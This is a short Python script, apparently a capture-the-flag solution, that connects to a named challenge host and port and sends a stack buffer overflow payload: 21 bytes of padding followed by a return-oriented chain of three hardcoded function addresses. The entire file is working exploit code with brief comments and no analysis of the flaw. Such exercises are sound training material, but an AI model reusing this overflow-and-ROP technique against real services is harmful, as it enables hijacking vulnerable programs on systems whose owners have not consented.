#simply ROP type bufferoverflow client
import socket
f3=0x8049e0b #adresses of functions
f2=0x8049dd8
f1=0x8049da5

f3bytes = f3.to_bytes(4, byteorder='little', signed=False)#integer to 4bytes little endian
f2bytes = f2.to_bytes(4, byteorder='little', signed=False)# for converting our function adress to LE bytes
f1bytes = f1.to_bytes(4, byteorder='little', signed=False)

#socket creation and definition
host = "E08-target.allyourbases.co" # example target
port =  8024                  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
#at first we are receiving some massage from server
data = s.recv(1024)
print('Received', repr(data))

#creating out payload
bytes_overflow =   b'\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'#21 bytes to hit the bufferoverflow
bytes_overflow +=f3bytes + f2bytes +f1bytes                                        #ROP function chain
bytes_overflow += b'\x0a' #end of line                                                          

s.sendall(bytes_overflow) # sending  our payload
data = s.recv(1024) #receiving response
print('Received', repr(data))
print('Received', data.decode("utf-8").replace("\n","")) # formating the response - deleting end of lines
s.close()
